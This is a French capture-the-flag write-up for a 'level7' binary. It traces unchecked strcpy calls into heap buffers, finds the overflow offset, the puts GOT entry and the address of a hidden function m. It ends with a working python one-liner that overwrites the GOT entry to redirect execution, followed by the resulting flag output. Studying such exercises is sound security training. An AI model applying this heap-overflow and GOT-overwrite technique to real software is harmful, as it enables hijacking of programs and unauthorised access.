```
objdump -M intel -d level7
```

On observe que 2 mallocs sont fait puis des strcpy afin de copier les arguments 1 et 2 dans leurs emplacements dédiés (4 appels à malloc car le premier argument de chaque
strcpy semble etre alloué.
```c
char *l[4];

l[0] = malloc(8);
l[1] = malloc(8);
l[2] = malloc(8);
l[3] = malloc(8);
strcpy(l[0], argv[1]);
strcpy(l[3], argv[2]);
```

Strcpy n'est pas protégé et copiera jusqu'à la fin de la string.
On remarque que le fichier contient aussi une fonction m non appelée.
L'objectif va etre d'appeler la fonction m.
Au sein du premier strcpy, nous pouvons remplacer l'adresse de destination par l'adresse Got (Global offset table)de puts.
Pour le second, nous allons remplacer l[3] par l'adresse de la fonction m.

```
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
0x37614136 -> 20
```
L'offset commence donc à 20

Trouvons l'adresse GoT de la fonction puts

```
objdump -R level7
08049928 R_386_JUMP_SLOT   puts
```

Il ne nous manque plus que l'adresse de m:
```
gdb ./level7
info function m
0x080484f4  m
```

Nous allons donc effectuer un padding de 20, inserer l'adresse got puis ajouter l'adresse de m que nous avons trouvé.

```
./level7 `python -c "print('a' * 20 + '\x28\x99\x04\x08' + ' ' +  '\xf4\x84\x04\x08')"`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1631696136
```
